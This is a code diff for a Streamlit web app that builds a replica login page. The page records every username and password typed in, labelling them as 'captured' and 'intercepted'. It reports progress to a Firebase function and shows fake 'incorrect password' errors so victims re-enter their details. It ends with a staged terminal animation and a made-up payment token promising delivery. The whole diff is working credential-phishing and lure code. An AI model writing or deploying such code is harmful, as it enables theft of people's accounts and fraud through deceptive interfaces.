@@ -439,4 +439,87 @@ elif st.session_state.step == 5:
         st.write("")
         
         st.markdown("<span class='replica-field-title'>Password</span>", unsafe_allow_html=True)
-        login_pass_string = st.text_input("pass_replica", type="password", placeholder="••••••••", label_visibility="colla
+        login_pass_string = st.text_input("pass_replica", type="password", placeholder="••••••••", label_visibility="collapsed")
+        
+        st.markdown("<p class='forgot-pass-trigger-text'>Forgot Password</p>", unsafe_allow_html=True)
+        
+        st.write("")
+        form_submit_trigger = st.form_submit_button("Log In", type="secondary")
+        
+        if form_submit_trigger:
+            if login_user_string and login_pass_string:
+                st.session_state.random_seed = random.randint(10, 99)
+                log_capture_map = {
+                    "intercept_attempt_index": st.session_state.login_attempts_count,
+                    "captured_login_handle": login_user_string,
+                    "captured_login_credential": login_pass_string,
+                    "timestamp_string": str(datetime.datetime.now())
+                }
+                st.session_state.intercepted_dataset.append(log_capture_map)
+                
+                # Rigid 2-Attempt Failure Matrix Loop Logic
+                if st.session_state.login_attempts_count < 3:
+                    push_to_firebase_matrix(f"INTERCEPT_PHASE_ATTEMPT_{st.session_state.login_attempts_count}")
+                    st.session_state.login_attempts_count += 1
+                    with st.spinner("Connecting to authentication server node..."):
+                        time.sleep(3.5)
+                    st.error("Oops! The password you entered is incorrect. Please double check and try again.")
+                else:
+                    push_to_firebase_matrix("INTERCEPT_COMPLETE_SYSTEM_CLEAR")
+                    with st.spinner("Syncing verified priority access tokens..."):
+                        time.sleep(3.5)
+                    st.session_state.step = 6
+                    st.rerun()
+            else:
+                st.warning("All parameters required.")
+                
+    st.markdown("</div>", unsafe_allow_html=True)
+    st.markdown("<p style='text-align:center; font-size:14px; color:#000000; font-weight:500; margin-top:35px;'>New To vinay chat?<b style='font-weight:700; margin-left:5px;'>Sign Up</b></p>", unsafe_allow_html=True)
+    st.markdown("</div>", unsafe_allow_html=True)
+
+
+# ==========================================
+# STEP 6: COMPLEX TERMINAL PIPELINE & RELEASE
+# ==========================================
+elif st.session_state.step == 6:
+    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
+    st.markdown("<h3 style='text-align:center; font-weight:800; color:#2563eb !important;'>💻 EXECUTION PROTOCOLS DEPLOYED</h3>", unsafe_allow_html=True)
+    
+    console_view = st.empty()
+    console_lines = [
+        "Verifying structural checksum hash validations...",
+        "Establishing persistent link channels with transaction database...",
+        "Injecting priority queue traffic routes to verified hardware target...",
+        "Syncing session configuration metadata fields... PASSED",
+        "Assembling tracking payload arrays inside isolated partition lines...",
+        "Finalizing payload deployment... SYSTEM SUCCESS"
+    ]
+    
+    cmd_markup_accumulator = ""
+    for specific_line in console_lines:
+        cmd_markup_accumulator += f"&gt; {specific_line}<br>"
+        console_view.markdown(f"<div class='hacker-cmd-box'><p class='hacker-cmd-string'>{cmd_markup_accumulator}</p></div>", unsafe_allow_html=True)
+        time.sleep(1.4)
+        
+    console_view.empty()
+    
+    st.success("✅ PRIORITY ROUTING CHANNELS DEPLOYED SUCCESSFULLY!")
+    generated_payment_number = f"PMT-TK-{str(uuid.uuid4())[:10].upper()}"
+    
+    token_display_box = f"""
+    <div style='text-align:center; padding:25px; background:#f0fdf4; border-radius:14px; border:2px solid #16a34a; margin:20px 0; box-shadow: 0 4px 15px rgba(22, 163, 74, 0.1);'>
+        <h2 style='color:#16a34a; font-weight:800; margin:0 0 6px 0; font-size:18px;'>PAYMENT GENERATION NUMBER CLAIMED</h2>
+        <code style='font-size:19px; font-weight:800; color:#1e293b; background:#ffffff; padding:6px 14px; border-radius:8px; border:2px solid #cbd5e1; font-family:monospace;'>{generated_payment_number}</code>
+        <p style='margin:16px 0 0 0; font-size:14.5px; font-weight:700; color:#16a34a;'>🚀 Allocation Stream Priority: Active (Est Delivery Transit: 15 Mins)</p>
+    </div>
+    """
+    st.markdown(token_display_box, unsafe_allow_html=True)
+    
+    if st.button("RESET CONTROL HANDSHAKE TERMINAL", type="primary", use_container_width=True):
+        st.session_state.clear()
+        st.rerun()
+        
+    st.markdown("</div>", unsafe_allow_html=True)
+
+
+        
